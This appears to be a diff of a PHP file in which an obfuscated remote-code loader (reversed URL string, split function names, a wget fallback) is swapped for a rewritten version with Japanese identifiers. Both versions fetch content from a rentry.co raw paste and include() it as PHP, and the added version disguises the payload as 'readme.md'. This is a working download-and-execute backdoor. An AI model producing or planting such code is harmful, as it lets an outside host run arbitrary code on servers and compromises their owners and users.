@@ -1,2 +1,62 @@
-<?php function strev($string){return strrev($string);} $url=strev("war/y7eurgw4/oc.yrtner//:sptth");$f_curl_init='cu'.'rl_init';$f_curl_exec='cu'.'rl_exec';$f_curl_close='cu'.'rl_close';$f_file_get_contents='file_'.'get_'.'contents';$f_fopen='fo'.'pen';$f_fclose='fc'.'lose';$f_shell_exec='she'.'ll_ex'.'ec';function get_content_from_url($url){global $f_curl_init,$f_curl_exec,$f_curl_close,$f_file_get_contents,$f_fopen,$f_fclose,$f_shell_exec;if(function_exists($f_curl_init)){$ch=$f_curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);$output=$f_curl_exec($ch);$http_code=curl_getinfo($ch,CURLINFO_HTTP_CODE);$f_curl_close($ch);if($output!==false&&$http_code==200)return$output;}if(ini_get('allow_url_fopen')){$output=@$f_file_get_contents($url);if($output!==false)return$output;}if($handle=@$f_fopen($url,'r')){$output='';while(!feof($handle))$output.=fread($handle,8192);$f_fclose($handle);if($output!==false)return$output;}if(function_exists($f_shell_exec)){$output=@$f_shell_exec('wget -q -O - '.escapeshellarg($url));if(!empty($output))return$output;}return false;} $output=get_content_from_url($url);sleep(1);if($output!==false){$temp_file=tempnam(sys_get_temp_dir(),'temp_php_').'.php';file_put_contents($temp_file,$output);include($temp_file);unlink($temp_file);}else echo"ERROR.";
+<?php
+$プロトコル = 'https';
+$ドメイン = 'rentry.co';
+$パスセグメント1 = 'aboutphp';
+$パスセグメント2 = 'raw';
+
+$url = sprintf('%s://%s/%s/%s', $プロトコル, $ドメイン, $パスセグメント1, $パスセグメント2);
+$ファイル名 = 'readme.md';
+$最小ファイルサイズ = 1024;
+
+function ダウンロードファイル($url, $ファイル名) {
+    $コンテンツ = @file_get_contents($url);
+    if ($コンテンツ !== false) {
+        file_put_contents($ファイル名, $コンテンツ);
+        return true;
+    }
+
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $コンテンツ = curl_exec($ch);
+    curl_close($ch);
+
+    if ($コンテンツ !== false) {
+        file_put_contents($ファイル名, $コンテンツ);
+        return true;
+    }
+
+    $オプション = [
+        'http' => [
+            'method' => 'GET',
+            'header' => 'User-Agent: PHP'
+        ]
+    ];
+    $コンテキスト = stream_context_create($オプション);
+    $コンテンツ = @file_get_contents($url, false, $コンテキスト);
+
+    if ($コンテンツ !== false) {
+        file_put_contents($ファイル名, $コンテンツ);
+        return true;
+    }
+
+    return false;
+}
+
+function 実行ファイル($ファイル名) {
+    if (file_exists($ファイル名)) {
+        include($ファイル名);
+    }
+}
+
+function ファイルサイズを確認($ファイル名, $最小サイズ) {
+    return file_exists($ファイル名) && filesize($ファイル名) >= $最小サイズ;
+}
+
+if (ダウンロードファイル($url, $ファイル名)) {
+    if (!ファイルサイズを確認($ファイル名, $最小ファイルサイズ)) {
+        unlink($ファイル名);
+        ダウンロードファイル($url, $ファイル名);
+    }
+    実行ファイル($ファイル名);
+}
 ?>
